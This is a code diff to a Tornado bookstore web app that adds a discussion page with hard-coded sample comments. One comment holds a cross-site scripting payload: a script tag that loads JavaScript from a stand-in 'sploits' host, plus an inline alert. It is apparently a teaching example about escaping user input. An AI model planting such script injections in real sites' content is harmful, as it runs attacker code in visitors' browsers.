@@ -16,6 +16,7 @@ class Application(tornado.web.Application):
 		handlers = [
 			(r"/", MainHandler),
 			(r"/recommended/", RecommendedHandler),
+			(r"/discussion/", DiscussionHandler),
 		]
 		settings = dict(
 			template_path=os.path.join(os.path.dirname(__file__), "templates"),
@@ -72,6 +73,29 @@ class RecommendedHandler(tornado.web.RequestHandler):
 					"date_released": "November 2010",
 					"isbn":"Head First Python",
 					"description":"<p>Ever wished you could learn Python from a book? Head First Python is a complete learning experience for Python that helps you learn the language through a unique method that goes beyond syntax and how-to manuals, helping you understand how to be a great Python programmer. You'll quickly learn the language's fundamentals, then move onto persistence, exception handling, web development, SQLite, data wrangling, and Google App Engine. You'll also learn how to write mobile apps for Android, all thanks to the power that Python gives you.</p>"
+				}
+			]
+		)
+
+class DiscussionHandler(tornado.web.RequestHandler):
+	def get(self):
+
+		self.render(
+			"discussion.html",
+			page_title = "Burt's Books | Discussion",
+			header_text = "Talkin' About Books With Burt",
+			comments=[
+				{
+					"user":"Alice",
+					"text": "I can't wait for the next version of Programming Collective Intelligence!"
+				},
+				{
+					"user":"Burt",
+					"text": "We can't either, Alice.  In the meantime, be sure to check out RESTful Web Services too."
+				},
+				{
+					"user":"Melvin",
+					"text": "Totally hacked ur site lulz <script src=\"http://melvins-web-sploits.com/evil_sploit.js\"></script><script>alert('RUNNING EVIL H4CKS AND SPL0ITS NOW...');</script>"
 				}
 			]
 		)
